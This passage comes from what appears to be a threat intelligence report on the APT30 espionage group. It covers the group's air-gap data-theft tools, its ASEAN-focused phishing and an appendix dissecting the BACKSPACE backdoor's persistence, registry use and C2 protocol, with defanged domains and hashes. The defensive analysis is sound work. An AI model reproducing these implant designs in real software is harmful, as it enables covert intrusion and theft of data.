hosts, and includes features to**\n**allow the operator to filter, prioritize, alert**\n**on, and otherwise manage his or her victims,**\n**implying operations large enough to warrant**\n**such features. The controller exhibits the same**\ndiligent version control and self-updating features\nobserved in other malware used by APT30. In\naddition, the serial number checks built in to\nthe BACKSPACE controller imply a very limited\ndistribution tool designed to be used by only a\nselect number of users. Finally, the “attendant”\ndialog box implies that the controller itself may\nhave been designed for use in a highly organized\nenvironment. All of these factors point to a threat\n**group with long-term, organized, and structured**\n**development resources; a need to manage and**\n**track a potentially large number of victims over**\n**time; and an organized work force responsible**\n**for carrying out the group’s objectives.**\n\n\n-----\n\n###### APT30’S PRIMARY MISSION: Data Theft for Political Gain\n\n\nased on our knowledge of APT30's targeting\nactivity and tools, their objective appears\nto be data theft as opposed to financial\n\n### B\n\ngain. APT30 has not been observed to target\nvictims or data that can be readily monetized (for\nexample, credit card data, personally identifiable\ninformation, or bank transfer credentials). Instead,\ntheir tools include functionality that allows them\nto identify and steal documents, including what\nappears to be an interest in documents that may be\nstored on air-gapped networks.\n\nBoth the BACKSPACE and NETEAGLE backdoors\nsupport a range of command functions that allow\nthe threat actors to manipulate files on the victim\nhost, including reading and writing files, searching\nfor files with specific names or attributes, deleting\nfiles, and uploading selected files to the controller.\n\n11 While those commands are not atypical for\nfull-featured backdoors, some of the BACKSPACE\ncommands are more specialized, returning file\nmetadata (such as file name, size, attributes, and\nMAC times) to the controller.[12] Transmitting\nmetadata allows BACKSPACE to send less\ndata to the server and for the threat actor to\ndetermine, based on results, which files to select\nfor uploading – both techniques result in less\n**data transferred over the network, which is less**\n**likely to draw attention.**\n\nSHIPSHAPE, SPACESHIP, and FLASHFLOOD are\nthree separate pieces of malware with different\nfunctions that appear to be designed to work\ntogether to infect removable drives, spread to\nadditional systems (including potentially airgapped systems), and steal files of interest. The\n\n\ntools frequently reference (in the mutexes, events,\nand registry keys they use) the terms “Flash”\n(perhaps for “flash drive”), “Ship”, “ShipTr”, and\n“ShipUp”, as though the tools were designed to\n“ship” data between computers and a removable\ndrive. We identified one SPACESHIP variant\nthat used the term “LunDu” where the term\n“ShipTr” would normally appear. “LunDu” (轮渡)\nmeans “ferry” in Chinese and the malware may\nbe designed to “ferry” stolen documents from\nan air-gapped network, to a removable drive, to\nan Internet-connected host where they can be\nremoved by the attacker. In addition, the malware\nfrequently uses the initials “LD” in several places,\nincluding the SHIPSHAPE version file (ldupver.\n```\ntxt), the folder \\$LDDATA$\\ used by some\n\n```\nversions of SPACESHIP to store stolen data, and\nthe .ldf file extension on the encoded files\ncontaining stolen data.\n\nThe three tools have separate but complimentary\nfunctions: [13]\n\n**SHIPSHAPE is designed to copy files from specific**\npaths on a SHIPSHAPE-infected computer\nto a removable drive inserted into the host.\nSHIPSHAPE looks for existing files and folders on\nthe removable drive and marks them as hidden.\nIt then copies executable files to the removable\ndrive, using the same names as the existing\nfiles and folders, but with an .exe extension.\nSHIPSHAPE modifies the host settings to hide file\nextensions, so the executables appear to be the\noriginal documents. When viewed in Windows\nExplorer, the contents of the removable drive\nappear normal:\n\n\n**Figure 16:**\nRemovable drive\ninfected\nby SHIPSHAPE\n\n\n-----\n\n###### APT30 identifies and steals documents, especially documents that may be stored on air-gapped networks.\n\nHowever, viewing the contents of the drive from the command line will show both sets of files:\n\n\n**Malicious files**\n\n\nA user attempting to “open” a document from\nthe infected drive would execute a copy of the\nmalware instead.\n\n**SPACESHIP is believed to be the malware that**\nis copied to a removable drive by SHIPSHAPE,\npresumably to transfer SPACESHIP to an airgapped computer. SPACESHIP is designed to\nsearch a victim computer for specific files (based\non file extension or last modified time). Files\nthat match the search criteria are compressed,\nencoded, and copied to a specified location on the\ninfected host. When a removable drive is inserted\ninto the infected computer, the encoded files are\ncopied from that location to the removable drive.\n\n\n**FLASHFLOOD is responsible for copying files**\nfrom an inserted removable drive to the hard drive\nof an infected computer, presumably to remove\nfiles transferred from the air-gapped system to\nan Internet-connected machine for removal from\nthe victim network. FLASHFLOOD will scan both\nthe infected system and any inserted removable\ndrive for specific files (based on file extension or\nlast modified time) and copy them to a specified\nlocation, using the same compression and\nencoding method as SPACESHIP. FLASHFLOOD\nmay also log additional information about the\nvictim host, including system information and data\nfrom the user’s Windows Address Book.\n\n\n-----\n\n###### APT30’S TARGETS ALIGN with Chinese Government Interests and Focus on Southeast Asia\n\n\n-----\n\n###### APT30 PURSUES MEMBERS of the Association of Southeast Asian Nations (ASEAN)\n\n\nhe group expresses a distinct interest in\norganizations and governments associated\nwith ASEAN, particularly so around the\n\n### T\n\ntime of official ASEAN meetings. ASEAN is a\nmajor regional organization whose member\nstates promote cooperation and collaboration\non a range of political, economic, educational,\nand social issues. ASEAN currently consists\nof ten member states: Indonesia, Malaysia,\nthe Philippines, Singapore, Thailand, Brunei,\nVietnam, Laos, Myanmar, and Cambodia.\n\n###### ASEAN-THEMED INFRASTRUCTURE\n AND CUSTOMIZED TOOLS\nAPT30 has registered ASEAN-themed domains\nfor C2 and compiled data-stealing malware\nthat appears to be specifically designed around\nASEAN events. APT30 is most likely trying to\n\n\ncompromise ASEAN members or associates to\nsteal information that would provide insight into\nthe region’s politics and economics.\n\nThe domain aseanm[.]com, which appears to be\ndesigned to mimic ASEAN’s legitimate domain\n```\n(www.asean.org), was first registered in March\n\n```\n2010. FireEye identified over 100 BACKSPACE\nmalware variants that use that domain for C2,\nwith compile dates that align with significant\nevents in the ASEAN community. The table below\nshows compile times for known BACKSPACE\nsamples that use aseanm[.]com for C2 frequently\nalign with ASEAN events:\n\n\n**Table 4: ASEAN events and compile times for BACKSPACE samples using aseanm.com, 2011 - 2012**\n\n|Event|Date|\n|---|---|\n|899f512f0451a0ba4398b41ed1ae5a6d compiled|5 May 2011 6:35|\n|e6035ec09025c1e349a7a0b3f41e90b1 compiled|5 May 2011 6:35|\n|18th ASEAN Summit, Jakarta, Indonesia|7–8 May 2011|\n|36a6a33cb4a13739c789778d9dd137ac compiled|9 May 2011 3:34|\n\n|Seventh ASEAN Plus Three Labour Ministers Meeting (7th ALMM+3), Phnom Penh, Cambodia 16|11 May 2012|\n|---|---|\n|572c9cd4388699347c0b2edb7c6f5e25 compiled|11 May 2012 0:06|\n|f3c29a67a7b47e644e9d1a2a0516974e compiled|11 May 2012 0:06|\n\n|Senior Officials from ASEAN and China meet on implementation of the Declaration on the Conduct of Parties on the East Sea (DOC)17|24–25 June 2012|\n|---|---|\n|afe8447990ecb9e1cd4086955b7db104 compiled|26 June 2012 1:43|\n|b5546842e08950bc17a438d785b5a019 compiled|26 June 2012 1:43|\n\n|ASEAN-India Commemorative Summit, New Delhi, India18|12–20 December 2012|\n|---|---|\n|310a4a62ba3765cbf8e8bbb9f324c503 compiled|20 December 2012 3:53|\n\n\n-----\n\nA large number of recent BACKSPACE samples\nhelps bolster our assessment that the malware\nwas compiled for use in campaigns centered\non major ASEAN issues. 87 more recent\nBACKSPACE samples using the C2 domain\n```\n             aseanm[.]com were compiled clustered around\n\n```\na handful of dates in January and April 2013. 35\nsamples were compiled on December 31, 2012\nand January 4 and 5, 2013; on January 1, 2013, a\nnew Secretary-General of ASEAN, Le Luong Minh,\ntook office for his five-year term.[19 20] Similarly, 61\nsamples were compiled on April 22 and 23, 2013;\nthe 22nd ASEAN Summit took place in Brunei on\nApril 24 – 25, 2013.\n\n###### CUSTOMIZED MALWARE DEPLOYED AROUND ASEAN SUMMITS IN JANUARY AND APRIL 2013\nThreat actors’ customization of malware can be a\ngood indication of their level of intent on gaining\naccess to a given target; it shows the actors\nhave put a concerted effort into their targeting\nattempts, instead of taking a widespread “spray\nand pray” approach. APT30 deployed customized\nmalware for use in specific campaigns targeting\nASEAN members or nations with close ties or\ninterests aligned with ASEAN states in January\n2013 and April 2013.\n\n**Table 5: Possible targets of 2013 BACKSPACE campaigns**\n\n\nAPT30 created the custom BACKSPACE “ZJ\nAuto” (mutex MicrosoftZjAuto), “ZJ Link”\n(mutex MicrosoftZjLnk), and “ZJ Listen” (mutex\n```\nZjListenLnk) variants. These malware samples\n\n```\nwere customized in two ways: (1) tailored URLs\nin BACKSPACE C2 communications that may\nrepresent ASEAN country codes, and (2) custom\ndata theft and communication functions.\n\n###### Tailored URLs\nOne of the customizations was in the specific\nURLs used for BACKSPACE C2 communications.\nBACKSPACE uses HTTP for much of its C2,\nretrieving various files from the first-stage C2\nserver, each of which may contain additional\ninstructions for the malware. The C2 URL format\nis typically http://<c2_domain>/<path>/<file>,\nwhere <c2_domain> is the first-stage C2 location,\n<path> is a directory name that may vary\nacross samples, and <filename> is the file to be\ndownloaded (e.g., dizhi.gif).\n\nThe <path> names used in the BACKSPACE\nsamples from January and April 2013 may\nindicate the country of origin for the malware’s\nintended victims (red added for emphasis) on the\ntable below:\n\n|BACKSPACE Variant|Path|Possible Target|\n|---|---|---|\n|ZJ Auto (version 1.4)|/autoIN/|India|\n|ZJ Auto (version 1.4)|/autoMM/|Myanmar|\n|ZJ Auto (version 1.4)|/autoSA/|unknown|\n|ZJ Auto (version 1.4)|/autoTH/|Thailand|\n|ZJ Link (version F2.2LnkN / F2.3LnkN)|/Forward-mci/|Singapore|\n|ZJ Link (version F2.2LnkN / F2.3LnkN)|/Forward-ph/|Philippines|\n|ZJ Link (version F2.2LnkN / F2.3LnkN)|/Forward-SA/|unknown|\n|ZJ Link (version F2.2LnkN / F2.3LnkN)|/Forward-th/|Thailand|\n|ZJ Link (version F2.2LnkN / F2.3LnkN)|/Forward-yw1/|unknown|\n|ZJ Listen (versions Lan2.2LnkN, Lan2.2LnkY)|/Forward-mci/|Singapore|\n|ZJ Listen (versions Lan2.2LnkN, Lan2.2LnkY)|/Forward-ph/|Philippines|\n|ZJ Listen (version Lan2.2LnkY)|/Forward-SA/|unknown|\n|ZJ Listen (version Lan2.2LnkY)|/Forward-th/|Thailand|\n|ZJ Listen (versions Lan2.2LnkN, Lan2.2LnkY)|/Forward-yw1/|unknown|\n\n\n-----\n\n###### Customized Malware Supporting\n Data Theft\nThe only identified BACKSPACE “ZJ Auto”\nvariants were all compiled on January 4 and 5,\n2013 and appear to be unique to that campaign.\nThis variant of BACKSPACE incorporated two\nadditional features of note. First, “ZJ Auto” will\nsearch a set of specified file paths for files of\ninterest, and upload the list of files found to the\nsecond-stage C2 server:\n\n- `%WINDIR%\\$NtUninstallKB900727$[22]`\n```\n• %WINDIR%\\$NtUninstallKB885884$\n• <CSIDL_PROGRAMS>\\Outlook Express\\data\n• <CSIDL_COMMON_PROGRAMS>\\Outlook\n  Express\\data\n\n```\n- custom paths specified in the file path.ini\n\nIn addition, the “ZJ Auto” variant of BACKSPACE\nincorporated the custom command “{” (0x7B).\nWhen the malware receives this command from\nthe controller, it will upload any files located in the\nspecified paths to the second-stage C2 server and\nthen delete them from the local drive.\n\n\nSimilarly, the “ZJ Link” variants were almost all\ncompiled in either January 2013 or April 2013,[23]\nand also appear to be largely unique to those\ncampaigns. The “ZJ Link” variants added the\ncommands “^” (0x5E) and “(“ (0x28). “^” downloads\na file to the special directory CSIDL_TEMPLATES[24]\nand renames the file. “(“ checks that the “ZJ\nLink”-infected computer can communicate with\na specified host[25] on ports 21, 80, and 443. “ZJ\nLink” appears to be designed to work on concert\nwith another unique variant, “ZJ Listen”.[26] “ZJ\nListen” variants listen for inbound connections on\nthose same ports (21, 80, and 443); it is the only\nvariant identified to date designed to receive C2\ncommands from an external source, as opposed\nto establishing an outbound connection to a\nC2 server. “ZJ Listen” could be installed on an\nisolated LAN with no direct Internet connectivity,\nwhile “ZJ Link” could be installed on a normal,\nInternet-accessible computer. “ZJ Link” can accept\nstandard commands from the BACKSPACE\nsecond-stage C2 server, and relay commands and\nresponses to the “ZJ Listen”-infected computer on\nthe isolated network.\n\n\n-----\n\n###### SOCIAL ENGINEERING  Consistently Includes Regional Security and Political Themes\n\n\nany of APT30’s decoy documents use\ntopics related to Southeast Asia, India,\nborder areas, and broader security and\n\n### M\n\ndiplomatic issues. Decoy documents attached to\nspear phishing emails are frequently indicators of\nintended targeting because threat actors generally\ntailor these emails to entice their intended targets\n—who typically work on related issues—to click on\nthe attachments and infect themselves.\n\n###### APT30 LEVERAGES MAJOR POLITICAL TRANSITION AS PHISHING LURE CONTENT IN CAMPAIGN GEARED TO KEY POLITICAL STAKEHOLDERS\nIn late summer 2014, FireEye detected an APT30\nspear phishing campaign at one of our regional\ncustomers. The decoy document topic related to\na significant political transition in Southeast Asia.\nThe phishing email, which contained a backdoor\ncompiled the day prior, was likely an attempt to gain\naccess to targets that would give APT30 actors\ninsight into the level of instability and pending\nchanges in the country’s political leadership.\nSuch information is typically a high priority for a\ngovernment’s intelligence collection efforts.\n\n\nAccording to the spear phishing emails’ recipients\nlist, the email was sent to over thirty recipients\nin the country’s Financial Services, Government\nand Defense sectors. APT30 targeted both\nprofessional and personal (Gmail, Hotmail) email\naccounts. The email was crafted entirely in the\ncountry’s language, and the message’s subject\ntranslated to “foreign journalists’ reactions to\nthe political transition.” This topic would likely\nbe of interest to individuals in security roles,\nleadership positions, diplomatic jobs, or public or\npress-facing roles. The spear phishing email was\neither sent from a compromised email account\nof one of the country’s governmental agencies\nor was convincingly spoofed to look as though it\noriginated from that agency.\n\n###### REPEATED DECOY SUBJECTS ON INDIA- CHINA MILITARY RELATIONS AND CONTESTED REGIONS\nAPT30 appears to use decoy documents about\nChina’s relationship with India, particularly\ntheir military relations, likely in an attempt to\ncompromise targets with information about this\nbilateral relationship. APT30 leveraged the text of\na legitimate academic journal on China’s border\nsecurity challenges in one of its decoy documents.\n\n\n**Figure 19:**\nAPT30 decoy\ndocument\non topics related\nto China’s border\nsecurity\n\n\n-----\n\n###### Several decoy themes center on Indian defense and military materiel topics.\n\n\nSimilarly, several of APT30’s decoy themes have\ncentered on Indian defense and military materiel\ntopics. In particular, a number of spear phishing\nsubjects have related to Indian aircraft carrier\nand oceanographic monitoring processes, which\nprobably indicates a specific interest in naval and\nmaritime themes around Indian military activity\nand disputes in the South China Sea. The decoy\ndocument depicted in Figure 20 correlates to the\nactual building and launch of India’s first Indianbuilt aircraft carrier.\n\nDecoy documents are not the only evidence\nof APT30’s targeting of Indian organizations.\nIndia-based users of VirusTotal have submitted\nAPT30 malware to the service, suggesting that\nIndian researchers discovered APT30’s suspicious\nactivity at Indian organizations as well. FireEye\nhas also identified alerts from APT30 malware at\nIndia-based customers including:\n\n- An Indian aerospace and defense company\n\n- An Indian telecommunications firm\n\nAnother recurring theme in APT30’s decoy\ndocuments relates to regionally contested\nterritories, including Bhutan and Nepal. Nepal and\nBhutan are important buffer states in China-India\nborder conflicts and represent an opportunity to\nassert regional military dominance in Asia.\n\n\n**Figure 21: APT30 decoy document on topics related to Bhutan**\n\n\n-----\n\n###### Nepal is a key battleground for influence between China and India, and serves a theme in APT30 decoy documents.\n\nThe decoy document depicted in Figure 21\ncorrelates to August 2013’s 21st Round of\nBoundary Talks between Bhutan and China. This\ntext was taken verbatim from press release put\nout by Bhutan’s Ministry of Foreign Affairs.[27]\n\nNepal is also a key battleground for influence\nbetween China and India and serves a theme in\nAPT30 decoy documents. Traditionally Nepal\nhas rested securely in India’s sphere of influence,\nbut more recently, China has become a more\n\n\ninfluential player with large investments in\ninfrastructure projects, increased funding to the\nmilitary and police, and other traditional Chinese\ninfluence efforts (for example, establishing\nConfucius Institutes). Beyond the ongoing border\ntensions, Nepal is also strategic to both India and\nChina for its significant water resources. The\ndecoy document below depicts a Nepal-related\nAPT30 phishing decoy document.\n\n\n**Figure 22: APT30 decoy document related to Nepal**\n\n\n-----\n\n#### 1\n\n**THE STATE OF THE**\n**CHINESE ECONOMY**\n\n#### 2\n\n**HIGH TECH**\n**REPORTING**\n\n**CORRUPTION**\n\n**ISSUES[3]**\n\n\nn addition to APT30’s Southeast Asia and\nIndia focus, we’ve observed APT30 target\njournalists reporting on issues traditionally\n\n### I\n\nconsidered to be focal points for the Chinese\nCommunist Party’s sense of legitimacy, such as\ncorruption, the economy, and human rights. In\nChina, the Communist Party has the ultimate\nauthority over the government. China-based\nthreat groups have targeted journalists\nbefore; we believe they often do so to get a\nbetter understanding on developing stories\nto anticipate unfavorable coverage and better\nposition themselves to shape public messaging.\n\nA FireEye as a Service customer in the media\nindustry received a spear phishing message\nin October 2012 with a subject line of “China\nMFA Press Briefing 29 October 2012- Full\nTranscript.” APT30 sent this message to over\nfifty other journalists of major global news\noutlets, including both official work accounts and\npersonal email accounts. Overall, the themes\non which the journalists reported fell into the\nfollowing categories 1 through 6, in rough order\n\n\n#### 4\n\n**DISSIDENT**\n**COVERAGE AND**\n\n**HUMAN**\n**RIGHTS ISSUES**\n\n(for example on\n\nUighur issues)\n\n#### 5\n\n**MARITIME**\n\n**DISPUTES**\n\n#### 6\n\n\nAPT30’s attempts to compromise journalists and\nmedia outlets could also be used to punish outlets\nthat do not provide favorable coverage – for\nexample, both the New York Times and Bloomberg\nhave had trouble securing visas for journalists in\nwake of unfavorable corruption reporting. [28]\n\nBeyond targeting, we also saw summaries of\nmedia events or reporting in decoy documents,\nparticularly around press releases related to\ngovernment or military updates. It appears that\nAPT30 could plausibly be targeting press attachés\nin order to obtain access to their contacts,\nwhich would presumably include the contact\ninformation of other public affairs personnel or\nother journalists of interest to target. Targeting\npress attachés would enable APT30 to target\njournalists from a trusted source, which would be\nan excellent resource for spear phishing.\n\n\n-----\n\n###### COUNTRIES WHERE APT30’S CONFIRMED AND LIKELY TARGETS OPERATE \n\n Countries with Confirmed APT 30 Targets Countries with Likely APT30 Targets\n\n\nIndia\n\nSouth Korea\n\nMalaysia\n\nVietnam\n\n\nThailand\n\nSaudi Arabia\n\nUnited States\n\n\nNepal\n\nBhutan\n\nPhilippines\n\nSingapore\n\n\nIndonesia\n\nBrunei\n\nMyanmar\n\nLaos\n\n\nCambodia\n\nJapan\n\n\n-----\n\n###### CONCLUSION\n\nAPT30’s operations epitomize a focused, persistent, and\nwell-resourced threat group. They appear to consider\nboth the timing of their operations and prioritize their\ntargets. Some of the their tools’ capabilities, most\nnotably the ability to infect air gapped networks, suggest\nboth a level of planning and interest in particularly\nsensitive data, such as that housed on government\nnetworks. The group’s method for selecting and\ntracking victims suggests a high level of coordination\nand organization among the group’s operators. With\nactivity spanning more than ten years, APT30 is one\nof the longest operating threat groups that we have\nencountered and one of the few with a distinct regional\ntargeting preference.\n\nOur research into APT30 demonstrates what many\nalready suspected: threat actors rely on cyber\ncapabilities to gather information about their immediate\nneighborhood, as well as on a larger, global scale. APT30\nappears to focus not on stealing businesses’ valuable\nintellectual property or cutting-edge technologies,\nbut on acquiring sensitive data about the immediate\nSoutheast Asia region, where they pursue targets that\npose a potential threat to the influence and legitimacy of\nthe Chinese Communist Party.\n\nIn exposing APT30, we hope to increase organizations’\nawareness of threats and ability to defend themselves.\nAPT30’s targeting interests underscore the need\nfor organizations across the region to defend the\ninformation assets valuable to determined threat actors.\n\n**Full indicators associated with APT30 are available at**\n**https://github.com/fireeye/iocs/**\n\n\n-----\n\n###### APPENDIX A   Detailed Malware Analysis\n\n BACKDOORS\nDespite their long history of operations, APT30 has primarily relied on a two backdoors to support\ntheir activity: BACKSPACE[29] and NETEAGLE. Both backdoors have evolved into a number of variants.\nBACKSPACE has diverged into two main branches (“ZJ” and “ZR”) with numerous variations throughout\neach branch. Similarly, NETEAGLE has two main versions, “Scout” and “Norton”, with Norton being the\nlater (more recent) version. The two backdoors differ widely in their development features, including\ndiffering programming languages and different sets of commands supported by each. Despite this,\nthe two also share some high-level design similarities, including update features and the use of twostage command and control infrastructures. The following table highlights some of the similarities and\ndifferences between the two families.[30]\n\n**Table 6: Comparison of BACKSPACE and NETEAGLE backdoors**\n\n|Col1|BACKSPACE|NETEAGLE|\n|---|---|---|\n|Development language Mutex C2 Domains May Attempt to Bypass Host-Based Firewall Callback format (may vary per sample) Second stage C2 Connect to second stage controller Format of second stage C2 configuration file Command format|C Differs across variants, but uses similar naming convention, e.g. MicrosoftZj, MicrosoftZJLnk, MicrosoftForZR, etc. Samples may use up to four C2 domains, for configuration retrieval, downloading updates, or as a backup domain if the primary fails. Yes (observed in some versions) GET /ForZRLnk1z/dizhi.gif HTTP/1.0 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)HOST: www.km153.com:80 Downloads configuration file dizhi.gif from first stage C2 URL Downloads connect.gif from first stage C2. If the file contains the victim host’s hostname and ID, connects to the controller. Plain text (dizhi.gif, connect.gif) Malware commands are letters|C++, MFC NetEagle_Scout, Eagle-Norton360- OfficeScan Samples use a single C2 domain. No (not observed) GET /update1/pic1.bmp HTTP/1.1 User-Agent: [name of malware binary] Host: www.creammemory.com Downloads configuration file pic1.bmp from first stage C2 URL Downloads pic2.bmp from first stage C2. If the file contains the victim host’s hostname and ID, connects to the controller. RC4 encrypted (pic1.bmp, pic2.bmp) Malware commands are numbers|\n\n\n-----\n\n###### BACKSPACE BACKDOOR – “ZJ” VARIANT\nThe “ZJ” branch of the BACKSPACE backdoor appears to be the oldest or “original” branch, with versions\ndating back to 2005. Variants of this branch are still being developed and compiled, adding a broad range\nof supported commands while still retaining the core functionality of the original versions.\n\nThe BACKSPACE variant 8c713117af4ca6bbd69292a78069e75b was compiled on August 26, 2014. It\nrepresents one member of the “ZJ” branch of the BACKSPACE malware family.\n\n###### Initial Execution\nThe mutex MicrosoftZjSYNoReg is used to guarantee that only one instance of the malware is running at\nany time. BACKSPACE also creates two events (MicrosoftSYNoRegExit, MicrosoftSYNoRegHaveExit)\nthat, when signaled, trigger all the threads and the malware itself to exit. A third event,\n```\n            MicrosoftSYNoRegHaveAck, is created to be used by the malware to synchronize the processing of a task\n\n```\nwith an acknowledgement received from the C2 server.\n\nThe malware extracts system information (OS version, build number, platform, service pack, default\nlanguage id) and proxy information (from the ProxyEnable and ProxyServer values under HKEY_CURRENT_\n```\n            USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\) from the victim host.\n\n```\nBACKSPACE then creates the registry values lnk (type REG_SZ) and hostid (type REG_DWORD) under the\n```\n            HKEY_CURRENT_USER\\Software\\Microsoft\\CurrentHalInf registry key:\n\n```\n               - `lnk is set NTO/mol which is the encoded[31] text MSN.lnk.`\n\n               - `hostid is set to a random value that is used to uniquely identify the victim computer.`\n\nThe malware creates a copy of itself in the folder <CSIDL_PROGRAMS>\\Messenger\\BIN as msmsgs.exe,\ncreating the folder if necessary. For persistence, BACKSPACE creates the Windows shortcut file MSN.lnk\nin <CSIDL_STARTUP> pointing to <CSIDL_PROGRAMS>\\Messenger\\BIN\\msmsgs.exe with the description\n\"Windows Messenger\".\n\n###### C2 Domains\nLike many BACKSPACE variants, this sample is configured with four different C2 domains. The C2\ndomains are used in HTTP requests for various files; each file requested via the URI provides additional\ninstructions or data to the malware. BACKSPACE C2 domains are typically used for different purposes –\nthat is, each domain is associated with different URIs whose associated files support different functions.\n\nFor this sample, the four C2 domains have the following roles:\n\n**Table 7: BACKSPACE C2 domains and registration dates**\n\n|Alias|C2 Domain|Description|Zone Registration Date|\n|---|---|---|---|\n|D1|www.iapfreecenter[.]com|Primary C2 domain|5/23/2014|\n|D2|www.appsecnic[.]com|Backup C2 domain; run/hide configuration|3/15/2010|\n|D3|www.newpresses[.]com|Run/hide configuration|3/17/2010|\n|D4|www.km153[.]com|Run/hide configuration|8/30/2007|\n\n\n-----\n\n###### “Run” vs “Hide” Mode\nBACKSPACE reads the registry value hFlag under HKEY_CURRENT_USER\\Software\\Microsoft\\\n```\nCurrentHalInf. If it exists and is set to 1 the malware switches to \"Run Mode\"; otherwise the malware\n\n```\noperates in \"Hidden Mode\".\n\nTo switch to “Run mode”, BACKSPACE attempts to contact its C2 servers for validation and to obtain\nconfiguration data (stored in a file named nur.txt). It parses the configuration data and performs a series\nof increasingly generic checks to see whether (by inclusion or exclusion) it should remain in “Run mode”:\n\n1. Make an HTTP request to www.iapfreecenter[.]com/Lnk1z/hostlist.txt and validate that the\nlast byte of the response is 0xFE.\n\n2. Make an HTTP request to the legitimate URL automation.whatismyip.com/n09230945.asp to\nobtain the external IP of the victim computer.\n\n3. Make an HTTP request to either www.newpresses[.]com/http/nur.txt, www.km153[.]com/\n```\n  http/nur.txt or www.appsecnic[.]com/http/nur.txt and validate that the response starts with\n\n```\n\"abcd1234\"; if none of the servers respond accordingly, setting \"Run Mode\" fails.\n\n4. If the response from the server contains the \"runhost=\" option, search for the victim computer’s\nhostname in the option data. If found, setting \"Run Mode\" succeeds; else go to step 5.\n\n5. If the response from the server contains the \"runhostexcept=\" option, search for the victim\ncomputer’s hostname in the option data. If found, setting \"Run Mode\" fails; else go to step 6.\n\n6. If the response from the server contains the \"runip=\" option, search for the victim computer’s\nexternal IP (obtained in step 2) in the option data. If found, setting \"Run Mode\" succeeds; else go to\nstep 7.\n\n7. If the response from the server contains the \"runipexcept=\" option, search for the victim computer’s\nexternal IP (obtained in step 2) in the option data. If found, setting \"Run Mode\" fails; else go to step 8.\n\n8. If the response from the server contains the \"rundir=\" option, search for the current C2 URL (e.g.,\n```\n  www.iapfreecenter[.]com/Lnk1z) in the option data. If found, setting \"Run Mode\" succeeds; else\n\n```\ngo to step 9.\n\n9. If the response from the server contains the \"rundirexcept=\" option, search for the current C2 URL\n(e.g., www.iapfreecenter[.]com/Lnk1z) in the option data. If found, setting \"Run Mode\" fails; else go\nto step 10.\n\n10. If the response from the server contains the \"runweb=\" option, search for the current C2 domain\n\n(e.g., www.iapfreecenter[.]com) in the option data. If found, setting \"Run Mode\" succeeds; else go\nto step 11.\n\n11. If the response from the server contains the \"runwebexcept=\" option, search for the current C2\n\ndomain (e.g., www.iapfreecenter[.]com) in the option data. If found, setting \"Run Mode\" fails; else\ngo to step 12.\n\n12. If the response from the server contains the \"runall=1\" option, setting \"Run Mode\" succeeds.\n\n\n-----\n\nIf switching to \"Run Mode\" fails, BACKSPACE reads the registry value PassPath under HKEY_CURRENT_\n```\nUSER\\Software\\Microsoft\\CurrentHalInf, attempts to terminate the process identified by the registry\n\n```\ndata, and then exits.\n\nIf BACKSPACE successfully switches to \"Run Mode\", the hFlag registry value under HKEY_CURRENT_USER\\\n```\nSoftware\\Microsoft\\CurrentHalInf is deleted. The victim computer’s hostname and IP are saved.\n\n```\nA thread to switch the malware back to \"Hidden Mode\" is started. The thread runs indefinitely\nuntil the MicrosoftSYNoRegExit event gets signaled; once signaled, the thread signals the\n```\nMicrosoftSYNoRegHaveExit event. In this thread, the malware reads the registry value PassPath under\nHKEY_CURRENT_USER\\Software\\Microsoft\\CurrentHalInf, attempts to terminate the process identified\n\n```\nby the registry data, and then exits.\n\nSimilar to switching to “Run mode” BACKSPACE conducts a series of checks to attempt to switch to\n\"Hidden Mode\":\n\n1. Make an HTTP request to www.iapfreecenter[.]com/Lnk1z/hostlist.txt and validate that the\nlast byte of the response is 0xFF.\n\n2. Make an HTTP request to the legitimate URL automation.whatismyip[.]com/n09230945.asp to\nobtain the external IP of the victim computer.\n\n3. Make an HTTP request to either www.newpresses[.]com/some/edih.txt, www.km153[.]com/\n```\n  some/edih.txt or www.appsecnic[.]com/some/edih.txt and validate that the response starts with\n\n```\n\"abcd1234\"; if none of the servers respond accordingly, setting \"Hidden Mode\" fails.\n\n4. If the response from the server contains the \"killpath=\" option, write the option data to the\nregistry value PassPath under HKEY_CURRENT_USER\\Software\\Microsoft\\CurrentHalInf; this data\nrepresents the path of a process to be terminated.\n\n5. If the response from the server contains the \"hidehost=\" option, search for the victim computer’s\nhostname in the option data. If found, setting \"Hidden Mode\" succeeds; else go to step 5.\n\n6. If the response from the server contains the \"hidehostexcept=\" option, search for the victim\ncomputer’s hostname in the option data. If found, setting \"Hidden Mode\" fails; else go to step 6.\n\n7. If the response from the server contains the \"hideip=\" option, search for the victim computer’s\nexternal IP (obtained in step 2) in the option data. If found, setting \"Hidden Mode\" succeeds; else go\nto step 7.\n\n8. If the response from the server contains the \"hideipexcept=\" option, search for the victim\ncomputer’s external IP (obtained in step 2) in the option data. If found, setting \"Hidden Mode\" fails;\nelse go to step 8.\n\n9. If the response from the server contains the \"hidedir=\" option, search for the current C2 URL (e.g.,\n```\n  www.iapfreecenter[.]com/Lnk1z or www.appsecnic[.]com/Lnk1z) in the option data. If found,\n\n```\nsetting \"Hidden Mode\" succeeds; else go to step 9.\n\n10. If the response from the server contains the \"hidedirexcept=\" option, search for the current C2\n\nURL in the option data. If found, setting \"Hidden Mode\" fails; else go to step 10.\n\n\n-----\n\n11. If the response from the server contains the \"hideweb=\" option, search for the current C2 domain\n\n(e.g., www.iapfreecenter[.]com or www.appsecnic[.]com) in the option data. If found, setting\n\"Hidden Mode\" succeeds; else go to step 11.\n\n12. If the response from the server contains the \"hidewebexcept=\" option, search for the current C2\n\ndomain in the option data. If found, setting “Hidden Mode\" fails; else go to step 12.\n\n13. If the response from the server contains the \"hideall=1\" option, setting \"Hidden Mode\" succeeds.\n\nIf BACKSPACE successfully switches to \"Hidden Mode\" succeeds, the hFlag registry value under HKEY_\n```\nCURRENT_USER\\Software\\Microsoft\\CurrentHalInf is created and set to 1.\n\n```\nThe malware stores the hostname of the victim computer’s primary Domain Controller to be sent to the\nsecond stage C2 server as part of the host details data.\n\n###### Primary vs Backup C2 Domains\nBACKSPACE sends an HTTP request to www.appsecnic[.]com/Lnk1z/bak.txt. If the response starts with\n\"qazWSX123$%^\", it sets the primary C2 URL domain to www.appsecnic[.]com.\n\n###### Download Additional Files\nBACKSPACE sends an HTTP request to the primary C2 URL domain and URL path /Lnk1z/app.txt and\nsaves the file to <CSIDL_PROGRAMS>\\Messenger\\BIN\\Temp.txt. Next, the downloaded file is copied to\n```\n<CSIDL_PROGRAMS>\\Messenger\\BIN as MessengerPlug.exe and if it is a valid PE file, a new process is\n\n```\nstarted.\n\nIn addition, 